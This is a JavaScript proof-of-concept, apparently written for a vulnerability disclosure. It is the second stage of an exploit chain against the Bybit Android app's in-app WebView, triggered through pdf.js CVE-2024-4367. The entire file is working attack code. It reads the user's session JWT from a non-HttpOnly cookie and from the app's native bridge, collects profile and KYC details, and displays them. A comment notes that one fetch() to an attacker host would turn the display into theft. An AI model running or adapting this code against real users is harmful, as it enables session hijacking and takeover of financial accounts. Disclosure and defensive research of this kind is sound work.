// Bybit Android in-app WebView: session-token disclosure PoC, stage 2.
//
// Runs as https://www.bybit.com inside com.bybit.app's in-app WebView after
// pdf.js 2.10.377 (CVE-2024-4367) executes the /FontMatrix payload in poc.pdf.
//
// It reads the logged-in account's session JWT through BOTH exposure paths and
// prints them on screen. It sends nothing anywhere: the token stays on the device.
// A real attacker replaces render() with one fetch() to their own host.
(function () {
  var out = { origin: location.origin, ua: navigator.userAgent };

  // Path 1: the app stores the session JWT in a cookie WITHOUT HttpOnly, scoped to
  // .bybit.com, so any script on any *.bybit.com page in this WebView can read it.
  var m = /(?:^|;\s*)b_t_c_k=([^;]+)/.exec(document.cookie);
  out.cookie_b_t_c_k = m ? decodeURIComponent(m[1]) : "(not found)";

  // Path 2: the native JS bridge. bybit.com is on the 55-entry bridge allowlist, and
  // UserProfile.getUserProfile returns the same JWT in params.userToken.
  window._b_bridge_callback_ = function (o) {
    try {
      var d = (typeof o === "string") ? JSON.parse(o) : o;
      if (d.params && d.params.userToken) {
        out.bridge_userToken = d.params.userToken;
        out.uid = d.params.uid;
        out.vagueEmail = d.params.vagueEmail;
        out.countryCode = d.params.countryCode;
        out.kycPersonLevel = d.params.kycPersonLevel;
        out.tokens_identical = (out.bridge_userToken === out.cookie_b_t_c_k);
      }
    } catch (e) { out.bridge_error = String(e); }
    render();
  };
  window.invokeCallback = window._b_bridge_callback_;
  window.flutter_inappwebview.callHandler("_b_bridge_UserProfile_", JSON.stringify({
    moduleName: "UserProfile", methodName: "getUserProfile", uniqueId: "poc1", params: {}
  }));

  function render() {
    var t = out.bridge_userToken || (out.cookie_b_t_c_k !== "(not found)" ? out.cookie_b_t_c_k : null);
    var claims = "";
    if (t) { try { claims = JSON.stringify(JSON.parse(atob(t.split(".")[1].replace(/-/g,"+").replace(/_/g,"/")))); } catch (e) {} }
    document.documentElement.innerHTML =
      "<pre style='font:11px monospace;white-space:pre-wrap;word-break:break-all;background:#fff;color:#000;padding:8px'>"
      + "BYBIT IN-APP SESSION TOKEN DISCLOSURE - PoC\n\n"
      + JSON.stringify(out, null, 1).replace(/</g, "&lt;")
      + "\n\nJWT claims: " + claims + "</pre>";
  }
  render();
})();
